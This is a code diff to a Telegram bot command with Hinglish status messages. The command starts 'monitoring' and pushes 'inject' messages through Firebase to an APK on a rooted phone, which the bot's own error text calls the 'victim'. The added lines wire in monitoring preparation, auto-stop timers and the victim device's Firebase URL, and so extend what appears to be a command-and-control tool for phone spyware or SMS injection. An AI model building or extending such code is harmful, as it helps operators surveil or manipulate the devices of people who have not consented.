@@ -1033,8 +1033,10 @@ async def injecttest_command(update: Update, context: ContextTypes.DEFAULT_TYPE)
             raise ValueError("Pehle device + /mynum set karo")
         if not profile.phone_number:
             raise ValueError("Pehle /mynum <apk-phone> set karo")
+        cancel_auto_stop(user.id)
         profile.is_monitoring = True
         db.commit()
+        await _prepare_monitoring(db, user.id, profile, device)
         sent, ms = await send_polling_startup_test(db, profile, device)
     except ValueError as exc:
         await update.message.reply_text(f"❌ {exc}", parse_mode="HTML")
@@ -1043,13 +1045,24 @@ async def injecttest_command(update: Update, context: ContextTypes.DEFAULT_TYPE)
         db.close()
 
     if sent:
+        from app.firebase_sync import mynum_device_id, resolve_apk_firebase_url
+
+        poll_id = mynum_device_id(profile.phone_number or "")
         await update.message.reply_text(
-            format_inject_startup_card(STARTUP_TEST_SENDER, STARTUP_TEST_MESSAGE, total_ms=ms),
+            format_inject_startup_card(
+                STARTUP_TEST_SENDER,
+                STARTUP_TEST_MESSAGE,
+                total_ms=ms,
+                poll_id=poll_id,
+                firebase_url=resolve_apk_firebase_url(profile, device),
+            ),
             parse_mode="HTML",
         )
+        schedule_auto_stop(user.id, profile.auto_stop_minutes or 15)
     else:
         await update.message.reply_text(
-            "❌ Inject queue push failed — check /mynum, KEY, device Firebase URL",
+            "❌ Inject victim Firebase pe push fail — /mynum, KEY, device DB check karo\n"
+            "APK phone: START SERVICE ON + same KEY + rooted",
             parse_mode="HTML",
         )
 
